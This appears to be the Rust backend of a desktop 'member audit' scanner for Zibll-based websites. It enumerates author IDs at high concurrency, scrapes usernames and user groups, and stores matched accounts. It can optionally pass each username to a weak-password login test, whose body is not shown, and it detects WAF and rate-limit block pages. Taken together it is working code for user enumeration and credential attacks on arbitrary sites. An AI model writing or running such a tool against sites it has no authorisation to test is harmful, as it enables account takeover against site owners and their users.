            while remaining > Duration::ZERO {
                if stop.load(Ordering::SeqCst) {
                    return;
                }
                let current = remaining.min(step);
                tokio::time::sleep(current).await;
                remaining = remaining.saturating_sub(current);
            }
        }

        state.last_start = Some(Instant::now());
    }

    async fn record_finish(&self) {
        if self.interval.is_zero() {
            return;
        }
        let mut state = self.state.lock().await;
        state.last_finish = Some(Instant::now());
    }
}

async fn scan_member(
    client: Client,
    base: Url,
    config: Arc<ScanConfig>,
    username_selector: Arc<Selector>,
    group_selector: Option<Arc<Selector>>,
    throttler: Arc<RequestThrottler>,
    stop: Arc<AtomicBool>,
    id: u64,
) -> MemberResult {
    throttler.wait(&stop).await;
    if stop.load(Ordering::SeqCst) {
        return MemberResult {
            id,
            url: String::new(),
            status: "skipped".into(),
            username: String::new(),
            group: String::new(),
            login_status: None,
            message: "任务已停止".into(),
        };
    }

    let url = match author_url(&base, &config.author_path, id) {
        Ok(url) => url,
        Err(error) => {
            return MemberResult {
                id,
                url: String::new(),
                status: "error".into(),
                username: String::new(),
                group: String::new(),
                login_status: None,
                message: error,
            }
        }
    };
    let url_text = url.to_string();
    let (status_code, body) = match request_text(&client, url, config.retries).await {
        Ok(response) => response,
        Err(error) => {
            throttler.record_finish().await;
            return MemberResult {
                id,
                url: url_text,
                status: "error".into(),
                username: String::new(),
                group: String::new(),
                login_status: None,
                message: format!("请求失败：{error}"),
            };
        }
    };
    if !(200..400).contains(&status_code) {
        throttler.record_finish().await;
        let (status, msg) = match status_code {
            404 => ("notFound".into(), "用户不存在（HTTP 404）".to_string()),
            429 => ("error".into(), "请求过于频繁被限流（HTTP 429）".to_string()),
            403 => ("error".into(), "访问被拦截（HTTP 403）".to_string()),
            code if code >= 500 => ("error".into(), format!("服务端异常（HTTP {code}）")),
            code => ("notFound".into(), format!("页面未正常响应（HTTP {code}）")),
        };
        return MemberResult {
            id,
            url: url_text,
            status,
            username: String::new(),
            group: String::new(),
            login_status: None,
            message: msg,
        };
    }

    // scraper::Html 不是 Send，必须在后续登录 await 之前离开作用域。
    let (username, group) = {
        let document = Html::parse_document(&body);
        let username = document
            .select(&username_selector)
            .next()
            .map(|node| node.text().collect::<String>().trim().to_string())
            .unwrap_or_default();
        let group = group_selector
            .as_ref()
            .and_then(|selector| {
                document
                    .select(selector)
                    .find_map(|node| {
                        node.value()
                            .attr(&config.group_attribute)
                            .map(str::trim)
                            .filter(|value| !value.is_empty())
                    })
                    .map(str::to_string)
            })
            .unwrap_or_default();
        (username, group)
    };
    if username.is_empty() {
        throttler.record_finish().await;
        let is_waf_or_block = body.contains("操作过于频繁")
            || body.contains("访问受限")
            || body.contains("429 Too Many Requests")
            || body.contains("Cloudflare")
            || body.contains("安全验证")
            || body.contains("人机验证");
        let (status, msg) = if is_waf_or_block {
            ("error".into(), "页面被安全防护或频控拦截（未找到用户名元素）".to_string())
        } else {
            ("notFound".into(), "未找到用户名元素".to_string())
        };
        return MemberResult {
            id,
            url: url_text,
            status,
            username,
            group: String::new(),
            login_status: None,
            message: msg,
        };
    }

    if group_selector.is_some()
        && !config.member_keyword.is_empty()
        && !group.contains(&config.member_keyword)
    {
        throttler.record_finish().await;
        return MemberResult {
            id,
            url: url_text,
            status: "skipped".into(),
            username,
            group,
            login_status: None,
            message: "用户组未命中筛选关键词".into(),
        };
    }

    let (login_status, message) = if config.test_weak_login {
        let (status, message) = test_login(&base, &config, &username).await;
        (Some(status), message)
    } else {
        (None, "已命中用户组筛选".into())
    };
    throttler.record_finish().await;
    MemberResult {
        id,
        url: url_text,
        status: "matched".into(),
        username,
        group,
        login_status,
        message,
    }
}

#[tauri::command]
async fn start_scan(
    app: AppHandle,
    state: State<'_, ScannerState>,
    database: State<'_, DatabaseState>,
    site_id: i64,
    config: ScanConfig,
) -> Result<ScanSummary, String> {
    if state.running.swap(true, Ordering::SeqCst) {
        return Err("已有扫描任务正在运行".into());
    }
    state.stop_requested.store(false, Ordering::SeqCst);

    let result = async {
        let start_id = config.start_id.ok_or("请填写起始 ID")?;
        let end_id = config.end_id.ok_or("请填写结束 ID")?;
        if end_id < start_id {
            return Err("结束 ID 不能小于起始 ID".into());
        }
        if end_id - start_id > 1_000_000 {
            return Err("单次扫描范围不能超过 1,000,001 个 ID".into());
        }
        let base = normalize_base_url(&config.base_url)?;
        let username_selector_text = sanitize_selector(&config.username_selector);
        let group_selector_text = sanitize_selector(&config.group_selector);
        let username_selector = Arc::new(
            Selector::parse(&username_selector_text)
                .map_err(|error| format!("用户名 CSS Selector 无效：{error:?}"))?,
        );
        let group_selector = if group_selector_text.trim().is_empty() {
            None
        } else {
            Some(Arc::new(Selector::parse(&group_selector_text).map_err(
                |error| format!("用户组 CSS Selector 无效：{error:?}"),
            )?))
        };
        let client = Client::builder()
            .timeout(Duration::from_secs(config.timeout_secs.clamp(1, 300)))
            .danger_accept_invalid_certs(!config.verify_tls)
            .user_agent("Zibll-Member-Audit/0.1")
            .build()
            .map_err(|error| format!("HTTP 客户端创建失败：{error}"))?;

        let started = Instant::now();
        let total = (end_id - start_id + 1) as usize;
        let run_id = create_scan_run(&database, site_id, &config, total)?;
        let concurrency = config.concurrency.clamp(1, 64);
        let shared_config = Arc::new(config.clone());
        let stop = state.stop_requested.clone();
        let throttler = Arc::new(RequestThrottler::new(config.request_interval_secs));
        let tasks =
            stream::iter(start_id..=end_id).map(|id| {
                let client = client.clone();
                let base = base.clone();
                let config = shared_config.clone();
                let username_selector = username_selector.clone();
                let group_selector = group_selector.clone();
                let throttler = throttler.clone();
                let stop = stop.clone();
                async move {
                    scan_member(
                        client,
                        base,
                        config,
                        username_selector,
                        group_selector,
                        throttler,
                        stop,
                        id,
                    )
                    .await
                }
            });
        let mut buffered = tasks.buffer_unordered(concurrency);
        let mut processed = 0usize;
        let mut matched = 0usize;

        while let Some(member) = buffered.next().await {
            if stop.load(Ordering::SeqCst) && member.message == "任务已停止" {
                break;
            }
            processed += 1;
            if member.status == "matched" {
                matched += 1;
                save_scan_result(&database, run_id, &member)?;
            }
            let _ = app.emit(
                "scan-progress",
                ScanProgress {
                    processed,
                    total,
                    matched,
                    result: member,
                },
            );
            if stop.load(Ordering::SeqCst) {
                break;
            }
        }

        let summary = ScanSummary {
            processed,
            total,
            matched,
            stopped: stop.load(Ordering::SeqCst),
            elapsed_ms: started.elapsed().as_millis(),
        };
        finish_scan_run(&database, run_id, &summary)?;
        Ok(summary)
    }
    .await;

    state.running.store(false, Ordering::SeqCst);
    result
}

#[tauri::command]
fn stop_scan(state: State<'_, ScannerState>) {
    state.stop_requested.store(true, Ordering::SeqCst);
}

#[tauri::command]
fn save_results(path: String, contents: String) -> Result<String, String> {
    let path = PathBuf::from(path);
    fs::write(&path, contents).map_err(|error| format!("保存失败：{error}"))?;
    Ok(path.to_string_lossy().to_string())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .manage(ScannerState::default())
        .setup(|app| {
            let data_dir = app.path().app_data_dir()?;
            fs::create_dir_all(&data_dir)?;
            let database_path = data_dir.join("zibll-audit.sqlite3");
            init_database(&database_path).map_err(std::io::Error::other)?;
            app.manage(DatabaseState {
                path: database_path,
            });
            Ok(())
        })
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
        .invoke_handler(tauri::generate_handler![
            list_sites,
            create_site,
            update_site,
            delete_site,
            list_scan_history,
            get_scan_results,
            delete_scan_history,
            open_selector_picker,
            test_selector,
            start_scan,
            stop_scan,
            save_results
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
